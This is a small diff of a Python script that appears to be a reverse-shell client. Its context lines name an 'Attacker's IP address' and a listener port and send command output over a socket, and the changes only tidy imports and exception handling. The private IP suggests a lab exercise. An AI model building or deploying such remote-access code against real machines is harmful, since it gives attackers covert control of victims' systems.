@@ -1,8 +1,8 @@
-from cryptidy import asymmetric_encryption
+# pylint: disable=bare-except
 import socket
 import subprocess
 import os
-import base64
+from cryptidy import asymmetric_encryption
 
 HOST = '10.0.2.4'  # Attacker's IP address
 PORT = 12345  # Same port number used in the listener
@@ -34,6 +34,5 @@ try:
             # s.send(encrypted_data_b64)
         else:
             s.send(b' ')
-except ConnectionResetError as e:
-    print('attacker disconnected')
-s.close()
+except:
+    s.close()
